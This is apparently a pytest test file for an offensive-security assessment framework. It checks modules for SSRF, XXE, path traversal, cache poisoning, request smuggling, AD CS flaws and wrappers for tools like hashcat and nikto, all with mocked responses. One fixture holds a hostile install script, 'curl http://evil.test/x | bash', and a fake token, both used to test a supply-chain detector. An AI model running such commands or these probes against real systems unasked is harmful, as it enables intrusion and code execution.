"""Behaviour tests for the expanded P3 validation and P4 tool packs.

No network and no external binaries: HTTP probing is monkeypatched at the
pack boundary and tool wrappers are exercised with fake subprocess output.
"""
from __future__ import annotations

import datetime as _dt
import json

import pytest

import modules.session as sm
from modules import attacks
from modules.attacks import p3_pack, p4_pack
from modules.session import Mode, Session, SessionMeta, SessionStatus


def _sess(tmp_path, target="127.0.0.1"):
    sm.SESSIONS_ROOT = tmp_path / "sessions"
    sm._manager = None
    now = _dt.datetime.now().isoformat()
    return Session(SessionMeta(
        session_id="expand", name="expand", target=target, mode=Mode.RED,
        status=SessionStatus.CREATED, created_at=now, updated_at=now))


def _log():
    from modules.logger import get_logger
    return get_logger("test.expansion")


def _run(mod, session, **spec):
    return attacks.get_attack(mod).execute(
        session, {"target": "http://127.0.0.1", "mode": "exec", **spec},
        _log())


# ─────────────────────────────────────────────────────────────
# P3 validation modules
# ─────────────────────────────────────────────────────────────

def test_open_redirect_flags_canary(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, **kw):
        return {"ok": True, "status": 302, "body": "",
                "headers": {"location": "https://ardf-canary.invalid/probe"}}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("open_redirect_audit", s, params=["next"])
    assert out["hits"] and out["hits"][0]["param"] == "next"
    assert s.get_findings()[-1].severity.name == "MEDIUM"


def test_ssrf_canary_flags_reflection(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, **kw):
        if "ardf-canary.invalid" in url:
            return {"ok": True, "status": 200, "headers": {},
                    "body": "fetched https://ardf-canary.invalid/probe",
                    "bytes": 45}
        return {"ok": True, "status": 200, "headers": {}, "body": "home",
                "bytes": 4}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("ssrf_canary_audit", s, params=["url"])
    assert out["hits"]
    assert "ssrf" in s.get_findings()[-1].tags


def test_path_traversal_flags_passwd(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, **kw):
        if ".." in url:
            return {"ok": True, "status": 200, "headers": {},
                    "body": "root:x:0:0:root:/root:/bin/bash"}
        return {"ok": True, "status": 200, "headers": {}, "body": "ok"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("path_traversal_audit", s, params=["file"])
    assert out["hits"] and out["hits"][0]["payload"] == "plain"
    assert s.get_findings()[-1].severity.name == "HIGH"


def test_ssti_flags_only_new_marker(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, **kw):
        if "%7B" in url or "%24" in url or "%3C" in url:
            return {"ok": True, "status": 200, "headers": {}, "body": "49"}
        # baseline already contains 49: must not be treated as a hit
        return {"ok": True, "status": 200, "headers": {}, "body": "49 items"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("ssti_canary_audit", s, params=["q"])
    assert out["hits"] == []


def test_nosql_flags_auth_shape_change(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, method="GET", headers=None, data=None, **kw):
        text = (data or b"").decode()
        if "$ne" in text or "$gt" in text:
            return {"ok": True, "status": 200, "headers": {},
                    "body": '{"token": "abc"}'}
        return {"ok": True, "status": 401, "headers": {},
                "body": "invalid credentials"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("nosql_injection_audit", s, url="http://127.0.0.1/login")
    assert out["hits"] and out["hits"][0]["operator"] == "$ne"


def test_xxe_flags_entity_resolution(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, method="GET", headers=None, data=None, **kw):
        if b"ENTITY" in (data or b""):
            return {"ok": True, "status": 200, "headers": {},
                    "body": "root:x:0:0:root"}
        return {"ok": True, "status": 200, "headers": {}, "body": "ok"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("xxe_audit", s)
    assert out["resolved"] is True
    assert "xxe" in s.get_findings()[-1].tags


def test_host_header_flags_reflection(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, headers=None, **kw):
        if headers and "ardf-canary.invalid" in " ".join(headers.values()):
            return {"ok": True, "status": 301, "body": "",
                    "headers": {"location": "https://ardf-canary.invalid/"}}
        return {"ok": True, "status": 200, "headers": {}, "body": "ok"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("host_header_audit", s, headers=["Host"])
    assert out["hits"] and out["hits"][0]["header"] == "Host"


def test_http_method_flags_trace(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, method="GET", **kw):
        if method == "OPTIONS":
            return {"ok": True, "status": 200,
                    "headers": {"allow": "GET, POST, PUT, TRACE"}, "body": ""}
        if method == "TRACE":
            return {"ok": True, "status": 200, "headers": {},
                    "body": "TRACE / HTTP/1.1\r\nMax-Forwards: 10"}
        return {"ok": True, "status": 200, "headers": {}, "body": ""}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("http_method_audit", s)
    assert out["trace_echo"] is True
    assert "TRACE" in out["dangerous"]


def test_websocket_flags_untrusted_origin(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    monkeypatch.setattr(p3_pack, "_ws_handshake",
                        lambda *a, **k: {"status": 101, "accepted": True})
    out = _run("websocket_origin_audit", s)
    assert out["untrusted_origin_accepted"] is True
    assert "cswsh" in s.get_findings()[-1].tags


def test_rate_limit_flags_missing_throttle(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    monkeypatch.setattr(p3_pack, "_http",
                        lambda *a, **k: {"ok": True, "status": 200,
                                         "headers": {}, "body": "ok"})
    out = _run("rate_limit_audit", s, requests=3)
    assert out["throttled"] is False
    assert out["requests"] == 3
    assert "rate-limit" in s.get_findings()[-1].tags


# ─────────────────────────────────────────────────────────────
# P4 tool-backed modules
# ─────────────────────────────────────────────────────────────

def _tool(monkeypatch, run):
    monkeypatch.setattr(p4_pack, "_need", lambda *a, **k: "/usr/bin/tool")
    monkeypatch.setattr(p4_pack, "_wordlist", lambda *a, **k: "/tmp/wl")
    monkeypatch.setattr(p4_pack, "_run", run)


def test_ffuf_parses_json_output(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_run(argv, timeout=0):
        out = argv[argv.index("-o") + 1]
        with open(out, "w", encoding="utf-8") as fh:
            json.dump({"results": [
                {"input": {"FUZZ": "admin"}, "status": 200,
                 "length": 12, "url": "http://127.0.0.1/admin"}]}, fh)
        return {"rc": 0, "stdout": "", "stderr": ""}

    _tool(monkeypatch, fake_run)
    out = _run("ffuf_content_enum", s)
    assert out["found"][0]["path"] == "admin"
    assert out["found"][0]["status"] == 200


def test_subfinder_drops_out_of_scope(tmp_path, monkeypatch):
    s = _sess(tmp_path, target="knutsford.edu.gh")

    def fake_run(argv, timeout=0):
        return {"rc": 0, "stderr": "",
                "stdout": "www.knutsford.edu.gh\nevil.example.net\n"}

    _tool(monkeypatch, fake_run)
    out = attacks.get_attack("subfinder_enum").execute(
        s, {"target": "knutsford.edu.gh", "mode": "exec"}, _log())
    assert out["hosts"] == ["www.knutsford.edu.gh"]
    assert out["dropped_out_of_scope"] == 1


def test_httpx_parses_jsonl(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    row = {"url": "http://127.0.0.1/", "status_code": 200,
           "title": "home", "tech": ["nginx"], "webserver": "nginx"}

    def fake_run(argv, timeout=0):
        return {"rc": 0, "stderr": "", "stdout": json.dumps(row) + "\n"}

    _tool(monkeypatch, fake_run)
    out = _run("httpx_probe", s)
    assert out["count"] == 1
    assert out["rows"][0]["tech"] == ["nginx"]


def test_naabu_parses_ports(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_run(argv, timeout=0):
        return {"rc": 0, "stderr": "",
                "stdout": "127.0.0.1:22\n127.0.0.1:443\n"}

    _tool(monkeypatch, fake_run)
    out = _run("naabu_port_scan", s)
    assert [p["port"] for p in out["ports"]] == [22, 443]


def test_katana_filters_scope(tmp_path, monkeypatch):
    s = _sess(tmp_path, target="knutsford.edu.gh")
    monkeypatch.setattr(p4_pack, "_need", lambda *a, **k: "/usr/bin/katana")
    monkeypatch.setattr(p4_pack, "_run", lambda *a, **k: {
        "rc": 0, "stderr": "",
        "stdout": "https://www.knutsford.edu.gh/a\nhttps://evil.test/b\n"})
    out = attacks.get_attack("katana_crawl").execute(
        s, {"target": "knutsford.edu.gh", "mode": "exec"}, _log())
    assert out["urls"] == ["https://www.knutsford.edu.gh/a"]
    assert out["dropped_out_of_scope"] == 1


def test_dalfox_parses_vuln_lines(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    line = "[VULN][GET] http://127.0.0.1/?q=<script> POC"
    _tool(monkeypatch, lambda *a, **k: {
        "rc": 0, "stderr": "", "stdout": line + "\n"})
    out = _run("dalfox_xss", s)
    assert out["hits_count"] == 1
    assert s.get_findings()[-1].severity.name == "HIGH"


def test_nikto_parses_plus_rows(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    _tool(monkeypatch, lambda *a, **k: {
        "rc": 0, "stderr": "",
        "stdout": "+ Server outdated: nginx 1.18\n+ /admin: Admin login\n"})
    out = _run("nikto_scan", s)
    assert out["count"] == 2
    assert "outdated" in out["findings"][0].lower()


def test_nxc_smb_parses_shares(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    monkeypatch.setattr(p4_pack, "_port_open", lambda *a, **k: True)
    _tool(monkeypatch, lambda *a, **k: {
        "rc": 0, "stderr": "",
        "stdout": "SMB 127.0.0.1 445 HOST [+] signing:False\n"
                  "SMB 127.0.0.1 445 HOST [+] \\\\HOST\\IPC$ READ\n"})
    out = _run("nxc_smb_enum", s)
    assert out["open"] is True
    assert out["signing_off"] is True
    assert "\\\\HOST\\IPC$" in out["shares"]


def test_bloodhound_requires_credentials(tmp_path):
    s = _sess(tmp_path)
    out = _run("bloodhound_ingest", s)
    assert out["status"] == "input_required"
    assert "username" in out["missing"]


def test_hashcat_requires_hash_then_reports_cracked(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    out = _run("hashcat_crack", s)
    assert out["status"] == "input_required"

    def fake_run(argv, timeout=0):
        pot = argv[argv.index("--potfile-path") + 1]
        with open(pot, "w", encoding="utf-8") as fh:
            fh.write("5f4dcc3b5aa765d61d8327deb882cf99:password\n")
        return {"rc": 0, "stdout": "", "stderr": ""}

    _tool(monkeypatch, fake_run)
    out = _run("hashcat_crack", s, hash="5f4dcc3b5aa765d61d8327deb882cf99",
               hash_mode=0, runtime=10)
    assert out["cracked_count"] == 1
    assert out["cracked"][0]["plaintext"] == "password"
    assert s.get_findings()[-1].severity.name == "HIGH"


# ─────────────────────────────────────────────────────────────
# P3 advanced assessments (formerly runbooks)
# ─────────────────────────────────────────────────────────────

def test_request_smuggling_flags_timeout_differential(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_raw(host, port, payload, **kw):
        if b"Content-Length: 6" in payload:
            return {"ok": False, "status": 0, "timed_out": True,
                    "error": "read timeout"}
        return {"ok": True, "status": 200, "timed_out": False, "bytes": 10}

    monkeypatch.setattr(p3_pack, "_raw_http", fake_raw)
    out = _run("request_smuggling_plan", s)
    assert out["baseline_status"] == 200
    assert len(out["possible_desync"]) == 2
    assert "framing" in s.get_findings()[-1].tags


def test_cache_poison_confirms_cached_canary(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    stored = {}

    def fake_http(url, headers=None, **kw):
        headers = headers or {}
        if "X-Forwarded-Host" in headers:
            canary = headers["X-Forwarded-Host"]
            stored[url] = canary
            return {"ok": True, "status": 200, "headers": {}, "body": canary}
        if url in stored:
            return {"ok": True, "status": 200, "headers": {"x-cache": "HIT"},
                    "body": stored[url]}
        return {"ok": True, "status": 200, "headers": {"x-cache": "MISS"},
                "body": "home"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("cache_poison_plan", s, headers=["X-Forwarded-Host"])
    assert out["cached_confirmation"] is True
    assert s.get_findings()[-1].severity.name == "HIGH"
    assert "_ardf=" in out["hits"][0]["cache_buster"]


def test_bola_flags_shared_object_fingerprint(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, headers=None, **kw):
        auth = (headers or {}).get("Authorization", "")
        if "TOKEN_A" in auth or "TOKEN_B" in auth:
            return {"ok": True, "status": 200, "headers": {},
                    "body": '{"id": 1, "owner": "a"}'}
        return {"ok": True, "status": 401, "headers": {}, "body": "denied"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("api_bola_plan", s,
               object_urls=["http://127.0.0.1/api/users/1"],
               token_a="TOKEN_A", token_b="TOKEN_B")
    assert out["results"][0]["same_object"] is True
    assert s.get_findings()[-1].severity.name == "HIGH"


def test_bola_requires_two_tokens(tmp_path):
    s = _sess(tmp_path)
    out = _run("api_bola_plan", s)
    assert out["status"] == "input_required"
    assert set(out["missing"]) == {"object_url or object_urls",
                                   "token_a", "token_b"}


def test_cloud_metadata_reports_reachable_root(tmp_path, monkeypatch):
    s = _sess(tmp_path)

    def fake_http(url, **kw):
        if "169.254.169.254" in url or "metadata.google" in url:
            return {"ok": True, "status": 200, "headers": {},
                    "body": "ami-id\ninstance-id\nplacement/"}
        return {"ok": True, "status": 404, "headers": {}, "body": "no"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("cloud_metadata_plan", s,
               ssrf_url="http://127.0.0.1/fetch", ssrf_param="url")
    assert out["reachable"] is True
    assert s.get_findings()[-1].severity.name == "HIGH"


def test_cloud_metadata_requires_ssrf_endpoint(tmp_path):
    s = _sess(tmp_path)
    out = _run("cloud_metadata_plan", s)
    assert out["status"] == "input_required"


def test_adcs_flags_web_enrollment_ntlm(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    monkeypatch.setattr(p3_pack.shutil, "which", lambda name: None)

    def fake_http(url, **kw):
        if "certsrv" in url:
            return {"ok": True, "status": 401,
                    "headers": {"www-authenticate": "NTLM"},
                    "body": "Microsoft Certificate Services CertSrv"}
        return {"ok": False, "error": "offline"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("adcs_esc_plan", s)
    assert any(w["esc8_candidate"] for w in out["web"])
    assert s.get_findings()[-1].severity.name == "HIGH"


def test_adcs_ldap_template_audit(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    monkeypatch.setattr(p3_pack.shutil, "which",
                        lambda name: "/usr/bin/ldapsearch")
    monkeypatch.setattr(p3_pack, "_http", lambda *a, **k: {"ok": False})
    ldif = (
        "dn: CN=UserAuth,CN=Certificate Templates,DC=corp,DC=test\n"
        "cn: UserAuth\n"
        "msPKI-Certificate-Name-Flag: 1\n"
        "pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2\n"
        "msPKI-Enrollment-Flag: 0\n"
        "msPKI-RA-Signature: 0\n\n")

    def fake_run(argv, timeout=0):
        if "defaultNamingContext" in argv:
            return {"rc": 0, "stdout": "defaultNamingContext: DC=corp,DC=test\n",
                    "stderr": ""}
        return {"rc": 0, "stdout": ldif, "stderr": ""}

    monkeypatch.setattr(p3_pack, "_run_tool", fake_run)
    out = _run("adcs_esc_plan", s)
    candidate = out["ldap"]["candidates"][0]
    assert candidate["template"] == "UserAuth"
    assert candidate["esc1"] is True
    assert s.get_findings()[-1].severity.name == "HIGH"


def test_supply_chain_flags_manifest_risks(tmp_path, monkeypatch):
    s = _sess(tmp_path)
    manifest = json.dumps({
        "dependencies": {"reqeusts": "1.0.0", "left-pad": "*"},
        "scripts": {"postinstall": "curl http://evil.test/x | bash"},
        "token": "ghp_" + "a" * 36,
    })

    def fake_http(url, **kw):
        if url.endswith("package.json"):
            return {"ok": True, "status": 200, "headers": {}, "body": manifest}
        return {"ok": True, "status": 404, "headers": {}, "body": "nope"}

    monkeypatch.setattr(p3_pack, "_http", fake_http)
    out = _run("supply_chain_plan", s, paths=["/package.json"])
    kinds = {issue["kind"] for issue in out["manifests"][0]["issues"]}
    assert {"unpinned", "dangerous_script", "typosquat_candidate",
            "secret"} <= kinds
    assert s.get_findings()[-1].severity.name == "HIGH"

